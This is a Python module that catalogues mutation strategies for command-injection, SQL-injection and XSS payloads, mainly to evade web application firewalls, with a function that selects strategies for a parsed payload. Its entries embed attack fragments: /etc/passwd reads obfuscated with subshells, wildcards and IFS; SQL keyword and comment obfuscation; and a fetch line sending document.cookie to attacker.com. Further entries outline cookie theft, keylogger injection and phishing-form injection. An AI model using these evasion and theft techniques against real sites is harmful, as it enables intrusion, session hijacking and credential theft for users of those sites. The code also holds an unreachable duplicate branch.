"""Generate part-level direction catalogues for the semantic agent.

Production-grade catalogue with comprehensive semantic mutation strategies
for command-injection, SQL-injection, and XSS.
"""

from __future__ import annotations

from typing import Any

from app.semantic_agent.parts.parser import VULNERABILITY_PART_TYPES

# ---------------------------------------------------------------------------
# Direction catalogue per vulnerability — part-level
# ---------------------------------------------------------------------------

CMD_DIRECTIONS: list[dict[str, str]] = [
    # ── Command-equivalent replacement family ──
    {"id":"part:command-equivalent","label":"命令等价替换","reason":"保持相同验证目标的命令等价表达（cat→head/tail/nl, whoami→id, ls→find .）"},
    # ── Separator replacement family ──
    {"id":"part:separator-change","label":"分隔符替换","reason":"替换命令分隔符为等价结构（; → | → || → && → %0a → $(...) → ``）"},
    # ── Argument transformation family ──
    {"id":"part:argument-change","label":"参数组织变换","reason":"改变命令参数的顺序、格式或路径组织方式（/etc/./passwd, /etc//passwd）"},
    {"id":"part:argument-add","label":"添加无害参数","reason":"添加不影响执行目标的非破坏性参数（cat -n, ls -la）"},
    # ── Control flow family ──
    {"id":"part:control-add","label":"添加控制流","reason":"添加管道或条件执行结构（| head, && echo DONE）"},
    {"id":"part:control-remove","label":"移除控制流","reason":"移除可选的管道或条件执行结构"},
    # ── Path resolution family ──
    {"id":"part:path-change","label":"路径解析变换","reason":"改变命令路径的引用方式（绝对路径→相对路径→PATH解析→which查找）"},
    # ── IFS / whitespace family ──
    {"id":"part:ifs-change","label":"空白分隔变换","reason":"使用 IFS、空格、制表符等不同空白方式（${IFS}, $IFS, \\t）"},
    # ── Error handling family ──
    {"id":"part:stderr-add","label":"添加错误抑制","reason":"添加 2>/dev/null 或 2>&- 非破坏性错误处理"},
    {"id":"part:stderr-remove","label":"移除错误抑制","reason":"移除 2>/dev/null 等错误抑制（测试 WAF 是否依赖错误输出）"},
    # ── Variable indirection family ──
    {"id":"part:var-indirect","label":"变量间接引用","reason":"通过变量间接构造命令名（c=cat;$c, x=ca;y=t;$x$y）"},
    # ── Brace expansion family ──
    {"id":"part:brace-expand","label":"花括号展开","reason":"使用 {a,b} 语法构造命令或参数（{cat,head}, {c,h}at, {/etc,/tmp}）"},
    # ── Wildcard family ──
    {"id":"part:wildcard","label":"通配符路径","reason":"使用 ? * [] 匹配命令或文件路径（/etc/pass?d, /etc/[p]asswd, /bin/c?t）"},
    # ── Bounded loop family ──
    {"id":"part:loop-add","label":"添加有限循环","reason":"添加有限次数、可终止的循环结构（for i in 1; do ...; done）"},
    {"id":"part:loop-remove","label":"移除循环","reason":"移除可选的有限循环结构"},
    # ── Subshell family ──
    {"id":"part:subshell-add","label":"添加子Shell","reason":"用 $(...) 或 `` 包装命令（$(cat /etc/passwd), `cat /etc/passwd`）"},
    {"id":"part:subshell-remove","label":"移除子Shell","reason":"移除子Shell包装，直接执行命令"},
    # ── Here-string / redirect family ──
    {"id":"part:herestring-add","label":"添加Here-string","reason":"使用 <<< 或 < 重定向输入替代命令行参数"},
    {"id":"part:herestring-remove","label":"移除Here-string","reason":"移除 Here-string / 输入重定向，恢复命令行参数形式"},
    # ── Structural recombination family ──
    {"id":"part:combine-two","label":"双技术组合","reason":"组合两个不同家族的语义变异技术（如分隔符替换+变量间接引用）"},
    {"id":"part:combine-three","label":"三技术组合","reason":"组合三个不同家族的语义变异技术（深层组合绕过）"},
    # ── Shell-specific family ──
    {"id":"part:bash-ism","label":"Bash特性利用","reason":"利用 bash 特有语法（ANSI-C引用 $'...', process substitution <(...), parameter expansion）"},
]

SQL_DIRECTIONS: list[dict[str, str]] = [
    # ── Predicate rewrite family (Boolean-class core) ──
    {"id":"part:predicate-rewrite","label":"谓词表达式重写","reason":"等价改写布尔谓词（1=1→1 BETWEEN 0 AND 2→1 IN (1)→NOT(1<>1)→CASE WHEN 1=1 THEN 1 END→EXISTS(SELECT 1)）"},
    {"id":"part:predicate-bitwise","label":"位运算谓词","reason":"用位运算等价谓词（1&1=1, 1|0=1, 1^0=1, ~0<>0）替代常规比较"},
    {"id":"part:predicate-regex","label":"正则/LIKE 谓词","reason":"用 LIKE/REGEXP/RLIKE 等模式匹配替代等号比较（'a' LIKE 'a', 'a' REGEXP '^a'）"},
    {"id":"part:predicate-cmp-func","label":"字符串函数谓词","reason":"用 STRCMP/LOCATE/INSTR/FIND_IN_SET/LENGTH 等函数构造真值表达式"},
    # ── Operator switch family ──
    {"id":"part:operator-switch","label":"逻辑运算符切换","reason":"替换 OR/AND 为等价符号或位运算（OR→||→|, AND→&&→&, NOT→!, XOR→^）"},
    # ── Comment terminator family ──
    {"id":"part:comment-change","label":"注释终结符替换","reason":"替换 # / -- / ;%00 / /*...*/ 注释方式（URL 路径投递下禁用 #，优先 `-- -`, `/**/`, `;%00`）"},
    {"id":"part:comment-inline","label":"内联注释注入","reason":"在关键字之间插入 /*!*/ /**/ /*!50000*/ 内联注释扰乱 WAF 词法（SELE/**/CT, UNI/*!*/ON）"},
    # ── Whitespace family ──
    {"id":"part:ws-change","label":"空白结构替换","reason":"替换空白为等价形式（空格→/**/→+→%09→%0a→括号包围）"},
    {"id":"part:paren-restructure","label":"括号重构","reason":"用括号消除空白依赖并改变解析结构（OR 1=1 → OR(1)=(1), UNION SELECT → UNION(SELECT ...)）"},
    # ── Subquery family ──
    {"id":"part:subquery-add","label":"添加子查询","reason":"用子查询包装恒真谓词或比较值（1=1→1=(SELECT 1)，'admin'→(SELECT 'admin')）"},
    {"id":"part:subquery-remove","label":"移除子查询","reason":"移除子查询包装，恢复直接比较"},
    # ── Value rewrite family ──
    {"id":"part:value-hex","label":"十六进制字面量","reason":"字符串/数字改写为 0x... 十六进制字面量（'admin'→0x61646D696E, 1→0x1）"},
    {"id":"part:value-char","label":"CHAR/CONCAT 构造值","reason":"用 CHAR(97,100,...) / CONCAT('a','d','m') / UNHEX() 构造字符串"},
    {"id":"part:value-scientific","label":"科学计数/浮点值","reason":"数字改写为科学计数、浮点、位串（1→1e0→1.0→b'1'→true）"},
    {"id":"part:value-cast","label":"CAST/CONVERT 包装","reason":"用 CAST/CONVERT 包装值（'admin'→CAST(0x61646D696E AS CHAR)）"},
    # ── UNION family ──
    {"id":"part:union-rewrite","label":"UNION 结构重写","reason":"UNION SELECT → UNION ALL SELECT / UNION(SELECT ...) / UNION/**/SELECT / /*!50000UNION*//*!50000SELECT*/"},
    {"id":"part:union-columns","label":"UNION 列值改写","reason":"UNION SELECT 的列值改为 NULL/0x.../CHAR(...)/子查询以避开列内容匹配"},
    # ── Function-substitution family ──
    {"id":"part:fn-time-swap","label":"延时函数替换","reason":"SLEEP(N) → BENCHMARK(N*1e6, MD5('a')) / GET_LOCK('x',N) / IF(1=1,SLEEP(N),0) / (SELECT SLEEP(N))"},
    {"id":"part:fn-error-swap","label":"报错函数替换","reason":"UpdateXML↔ExtractValue↔GTID_SUBSET↔EXP(~(SELECT...))↔FLOOR(RAND()*2) GROUP BY 报错"},
    {"id":"part:fn-info-swap","label":"信息函数同义替换","reason":"database()↔schema(), user()↔current_user(), version()↔@@version↔@@global.version, SUBSTRING↔MID↔SUBSTR"},
    {"id":"part:fn-version-wrap","label":"版本条件注释包裹","reason":"用 /*!50000...*/ 包裹关键字：SELECT→/*!50000SELECT*/, UNION→/*!UNION*/"},
    # ── Keyword obfuscation family ──
    {"id":"part:case-mix","label":"关键字大小写混合","reason":"SELECT→SeLeCt→sElEcT, UNION→UnIoN, database→DaTaBaSe（须叠加另一维度）"},
    {"id":"part:keyword-comment","label":"关键字内插注释","reason":"UNION→UN/**/ION, SELECT→SEL/**/ECT, DATABASE→DATA/**/BASE"},
    # ── Stacked-query family (only when base is stacked) ──
    {"id":"part:stacked-swap","label":"堆叠语句等价替换","reason":"堆叠查询的第二条语句改写（; DROP → ; SELECT ... / ; CREATE ...）"},
    # ── Clause restructuring family ──
    {"id":"part:clause-restructure","label":"子句结构重组","reason":"WHERE/ORDER BY/LIMIT 重排、条件重序、追加 FROM DUAL"},
    # ── Structural combination family ──
    {"id":"part:sql-combine","label":"SQL技术组合","reason":"组合 2+ 种 SQL 语义变异技术（谓词重写+注释替换+空白替换 或 函数替换+HEX 值+版本注释）"},
]

XSS_DIRECTIONS: list[dict[str, str]] = [
    # ── Tag switch family ──
    {"id":"part:tag-switch","label":"标签替换","reason":"替换 HTML 标签为等价 XSS 触发标签（<script>→<img>→<svg>→<video>→<audio>→<details>→<body>→<input>→<iframe>）"},
    # ── Event handler family ──
    {"id":"part:event-switch","label":"事件处理器替换","reason":"替换事件处理器为不同触发事件（onerror→onload→ontoggle→onfocus→onstart→oncanplay→onseeking→ontimeupdate）"},
    # ── JS expression family ──
    {"id":"part:expression-rewrite","label":"JS 表达式重写","reason":"等价替换 JavaScript 执行表达式（alert(1)→prompt(1)→confirm(1)→eval('alert(1)')→Function('alert(1)')()）"},
    {"id":"part:expression-data-exfil","label":"数据窃取表达式","reason":"用数据窃取表达式替换简单弹窗（alert(1)→fetch('http://attacker.com/?c='+document.cookie)→navigator.sendBeacon(...)）"},
    # ── Closure family ──
    {"id":"part:closure-change","label":"闭合结构变换","reason":"替换标签闭合方式（>→/>→autofocus>→/onerror=...>）"},
    # ── Spacing family ──
    {"id":"part:spacing-change","label":"文本间距变换","reason":"替换空白/间距结构（空格→\\t→\\n→\\r→\\f→无空格属性语法）"},
    # ── Namespace family ──
    {"id":"part:namespace-switch","label":"命名空间替换","reason":"使用 SVG/MathML 等不同 XML 命名空间触发 XSS"},
    # ── Nested tags family ──
    {"id":"part:nested-tags","label":"嵌套标签组合","reason":"使用嵌套标签触发 XSS（<video><source onerror=...>、<svg><animate onbegin=...>）"},
    # ── Media events family ──
    {"id":"part:media-events","label":"媒体事件利用","reason":"使用 HTML5 媒体标签的丰富事件（onloadstart、oncanplay、ontimeupdate、onseeking、ondurationchange）"},
    # ── Advanced attack family ──
    {"id":"part:cookie-theft","label":"Cookie 窃取","reason":"构造 Cookie 窃取 payload（document.cookie 外传）"},
    {"id":"part:storage-theft","label":"Storage 窃取","reason":"构造 localStorage/sessionStorage 窃取 payload"},
    {"id":"part:keylogger","label":"键盘记录","reason":"注入键盘记录器监听用户输入"},
    {"id":"part:dom-manipulation","label":"DOM 篡改","reason":"篡改页面 DOM 结构或内容"},
    {"id":"part:phishing-injection","label":"钓鱼页面注入","reason":"注入伪造登录表单窃取凭据"},
    # ── Structural combination family ──
    {"id":"part:xss-combine","label":"XSS技术组合","reason":"组合 2+ 种 XSS 语义变异技术（标签替换+事件替换+表达式重写）"},
    # ── Attribute boundary family ──
    {"id":"part:attr-boundary","label":"属性边界变换","reason":"改变属性引号/边界样式（单引号→双引号→无引号→反引号）"},
]

DIRECTIONS_BY_VULN: dict[str, list[dict[str, str]]] = {
    "command-injection": CMD_DIRECTIONS,
    "sql-injection": SQL_DIRECTIONS,
    "xss": XSS_DIRECTIONS,
}


def semantic_part_directions(
    vulnerability_or_parts: str | list[dict[str, Any]],
    vulnerability: str | None = None,
    base_parts: list[dict[str, Any]] | None = None,
) -> list[dict[str, str]]:
    """Return the applicable part-level direction catalogue.

    Can be called as:
        semantic_part_directions(vulnerability)   — all directions for that vuln
        semantic_part_directions(parts, vulnerability) — filtered to applicable

    Args:
        vulnerability_or_parts: Either a vulnerability string or list of parsed parts
        vulnerability: Required when first arg is parts
        base_parts: (deprecated alias, use first arg)

    Returns:
        List of {id, label, reason} direction dictionaries
    """
    # Resolve overloaded first argument
    if isinstance(vulnerability_or_parts, str):
        vuln = vulnerability_or_parts
        parts = base_parts or []
    elif isinstance(vulnerability_or_parts, list):
        vuln = vulnerability or ""
        parts = vulnerability_or_parts
    else:
        return []

    if not vuln:
        return []

    all_directions = DIRECTIONS_BY_VULN.get(vuln, [])
    if not parts:
        # Return all directions unfiltered when no parts context available
        return [dict(d) for d in all_directions]

    part_types = {p.get("part_type") for p in parts}

    # Detect the SQL attack class the parser tagged on the predicate so we can
    # foreground class-specific mutation directions.
    attack_class = ""
    if vuln == "sql-injection":
        for p in parts:
            if p.get("part_type") == "predicate":
                role = p.get("semantic_role", "") or ""
                if "attack_class=time" in role:
                    attack_class = "time"
                elif "attack_class=error" in role:
                    attack_class = "error"
                elif "attack_class=union" in role:
                    attack_class = "union"
                elif "attack_class=stacked" in role:
                    attack_class = "stacked"
                else:
                    attack_class = "boolean"
                break

    # SQL directions that only make sense for a specific attack class.
    _sql_class_only: dict[str, set[str]] = {
        # Time-based only when a delay function is present.
        "part:fn-time-swap": {"time"},
        # Error-based only when a report function is present.
        "part:fn-error-swap": {"error"},
        # UNION restructure/column rewrite only for UNION payloads.
        "part:union-rewrite": {"union"},
        "part:union-columns": {"union"},
        # Stacked-swap only for stacked queries.
        "part:stacked-swap": {"stacked"},
        # Value/predicate rewrites are meaningless for pure stacked/time payloads
        # where the interesting structure is the function or the second statement.
        "part:value-hex": {"boolean", "union", "error"},
        "part:value-char": {"boolean", "union", "error"},
        "part:value-scientific": {"boolean", "union", "error"},
        "part:value-cast": {"boolean", "union", "error"},
        "part:predicate-rewrite": {"boolean", "union", "error"},
        "part:predicate-bitwise": {"boolean", "error"},
        "part:predicate-regex": {"boolean", "error"},
        "part:predicate-cmp-func": {"boolean", "error"},
    }

    applicable: list[dict[str, str]] = []
    for d in all_directions:
        did = d["id"]

        # ── Command injection filtering ──

        # stderr-add: only if no stderr_handling present
        if did == "part:stderr-add":
            if "stderr_handling" not in part_types:
                applicable.append(dict(d))
        elif did == "part:stderr-remove":
            if "stderr_handling" in part_types:
                applicable.append(dict(d))

        # control-add: only if no pipeline/conditional present
        elif did == "part:control-add":
            if "pipeline" not in part_types and "conditional" not in part_types:
                applicable.append(dict(d))
        elif did == "part:control-remove":
            if "pipeline" in part_types or "conditional" in part_types:
                applicable.append(dict(d))

        # loop-add/remove
        elif did == "part:loop-add":
            if "bounded_loop" not in part_types:
                applicable.append(dict(d))
        elif did == "part:loop-remove":
            if "bounded_loop" in part_types:
                applicable.append(dict(d))

        # subshell-add/remove
        elif did == "part:subshell-add":
            if "subshell" not in part_types:
                applicable.append(dict(d))
        elif did == "part:subshell-remove":
            if "subshell" in part_types:
                applicable.append(dict(d))

        # herestring-add/remove
        elif did == "part:herestring-add":
            if "here_string" not in part_types:
                applicable.append(dict(d))
        elif did == "part:herestring-remove":
            if "here_string" in part_types:
                applicable.append(dict(d))

        # var-indirect: always applicable for command-injection
        elif did == "part:var-indirect":
            applicable.append(dict(d))

        # brace-expand: always applicable for command-injection
        elif did == "part:brace-expand":
            applicable.append(dict(d))

        # wildcard: applicable if argument exists
        elif did == "part:wildcard":
            if "argument" in part_types or "injection_command" in part_types:
                applicable.append(dict(d))

        # combine: always applicable (encourages multi-technique)
        elif did in ("part:combine-two", "part:combine-three",
                     "part:sql-combine", "part:xss-combine"):
            applicable.append(dict(d))

        # bash-ism: always applicable for command-injection (but note limited shell compatibility)
        elif did == "part:bash-ism":
            applicable.append(dict(d))

        # ── SQL injection filtering ──

        # SQL attack-class-scoped directions
        elif did in _sql_class_only:
            if not attack_class or attack_class in _sql_class_only[did]:
                applicable.append(dict(d))

        elif did == "part:subquery-add":
            if "subquery" not in part_types:
                applicable.append(dict(d))
        elif did == "part:subquery-remove":
            if "subquery" in part_types:
                applicable.append(dict(d))

        elif did == "part:join-add":
            if "join_or_union" not in part_types:
                applicable.append(dict(d))

        # Attack-class-specific SQL directions — only surface when the payload
        # actually belongs to that class so we don't propose incompatible ops.
        elif did in _sql_class_only:
            if attack_class and attack_class in _sql_class_only[did]:
                applicable.append(dict(d))

        # ── Default: include ──

        else:
            applicable.append(dict(d))

    return applicable
